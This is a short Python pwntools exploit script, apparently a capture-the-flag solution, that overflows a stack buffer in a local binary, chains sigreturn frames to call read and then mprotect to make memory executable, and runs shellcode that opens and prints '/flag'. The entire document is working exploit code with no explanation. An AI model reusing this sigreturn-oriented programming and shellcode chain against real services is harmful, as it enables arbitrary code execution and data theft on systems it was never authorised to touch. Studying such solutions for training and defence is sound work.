from pwn import *

context.update(arch="amd64", os="linux")
context.terminal = ["qterminal", "-e"]
context.log_level = "debug"

syscall = p64(0x40129D)
sigreturn = p64(0x401296)
fram_1 = SigreturnFrame()
fram_1.rax = constants.SYS_read
fram_1.rdi = 0
fram_1.rsi = 0x404000
fram_1.rdx = 0x300
fram_1.rip = 0x40129D
fram_1.rsp = 0x404000


fram_2 = SigreturnFrame()
fram_2.rax = constants.SYS_mprotect
fram_2.rdi = 0x404000 & 0xFFFFFFFFFFFFF000
fram_2.rsi = 0x1000
fram_2.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
fram_2.rip = 0x40129D
fram_2.rsp = 0x404100
#p = process("./vuln")
p=remote('localhost',40121)
#gdb.attach(p, "b* 0x4012CF")


paylaod1 = b"a" * 40 + sigreturn + bytes(fram_1)
p.sendline(paylaod1)
pause()
sleep(0.1)
# sys_read
shellcode = asm(
    shellcraft.open("/flag")
    + shellcraft.read("rax", "rsp", 100)
    + shellcraft.write(1, "rsp", 100)
)
payload2=sigreturn+bytes(fram_2)+p64(0x404108)+shellcode
p.sendline(payload2)
pause()
p.interactive()